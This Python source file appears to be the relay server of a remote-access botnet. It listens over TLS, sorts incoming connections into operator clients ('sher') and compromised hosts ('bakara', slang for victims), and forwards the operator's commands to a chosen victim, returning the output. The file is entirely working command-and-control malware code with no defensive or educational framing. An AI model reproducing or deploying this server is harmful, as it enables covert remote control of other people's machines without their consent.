import socket,json
import threading,time
import ssl
active_bakare={}
active_sher=[]
IP=socket.gethostbyname(socket.gethostname())
print(IP)
PORT=8080

def reliable_send(data,connection):
    json_data=json.dumps(data)
    connection.send(json_data.encode("utf-8"))

def reliable_receive(connection):
    json_data=""
    while True:
        try:
            json_data=json_data+connection.recv(1024).decode("utf-8")
            print(json_data)
            return json.loads(json_data)
        except ValueError:
            continue

# def handle_sher_bakara(sher_socket):
#     while True:
#         try:
#             while len(active_bakare)==0:
#                 reliable_send("[-] Bakara Disconnected",sher_socket)
#                 active_bakare.pop(n)
#                 handle_sher(sher_socket)
#             command=reliable_receive(sher_socket)
#             if command[0]=="change_bakara":
#                 reliable_send(list(active_bakare.keys()),sher_socket)
#                 n=reliable_receive(sher_socket)
#                 continue
#             reliable_send(command,active_bakare[n])
#             reliable_send(reliable_receive(active_bakare[n]),sher_socket)
#         except ConnectionResetError or ssl.SSLEOFError:
#             try:
#                 reliable_send("[-] Bakara disconnected",sher_socket)
#                 active_bakare.pop(n)
#             except:
#                 active_sher.remove(sher_socket)
#                 sher_socket.close()
#                 break
#         except Exception as e:
#             reliable_send('[-] Main Server ERR : \n%s'%str(e),sher_socket)
#             sher_socket.close()
#             break

def handle_sher(sher_socket):
    while True:
        while len(active_bakare)==0:
            reliable_send("No bakara is connected\nRefreshing list in 10 seconds",sher_socket)
            time.sleep(10)
        bakare=list(active_bakare.keys())
        reliable_send(bakare,sher_socket)
        n=reliable_receive(sher_socket)
        while True:
            try:
                while len(active_bakare)==0:
                    reliable_send("[-] Bakara Disconnected",sher_socket)
                    active_bakare.pop(n)
                    handle_sher(sher_socket)
                command=reliable_receive(sher_socket)
                if command[0]=="change_bakara":
                    reliable_send(list(active_bakare.keys()),sher_socket)
                    n=reliable_receive(sher_socket)
                    continue
                reliable_send(command,active_bakare[n])
                reliable_send(reliable_receive(active_bakare[n]),sher_socket)
            except ConnectionResetError:
                try:
                    reliable_send("[-] Bakara disconnected",sher_socket)
                    active_bakare.pop(n)
                except:
                    active_sher.remove(sher_socket)
                    sher_socket.close()
                    break
            except Exception as e:
                reliable_send('[-] Main Server ERR : \n%s'%str(e),sher_socket)
                sher_socket.close()
                break

                
        

context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
context.minimum_version = ssl.TLSVersion.TLSv1_2
context.maximum_version = ssl.TLSVersion.TLSv1_3
context.load_cert_chain(certfile="ca.crt", keyfile="ca.key")
listener=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
listener.bind((IP,PORT))
listener.listen(5)
print("[+] Waiting for incoming connections")
while True:
    try:
        connection,addr=listener.accept()
        connection = context.wrap_socket(connection, server_side=True)
        print("[+] Got a connection from " + str(addr))
        if reliable_receive(connection)=="sher":
            sher_thread=threading.Thread(target=handle_sher,args=(connection,))
            active_sher.append(connection)
            sher_thread.start()
        else:
            active_bakare[addr[0]]=connection
    except Exception as e:
        print("[-] Connection ERR in Main Server: \n%s"%str(e))
        continue
        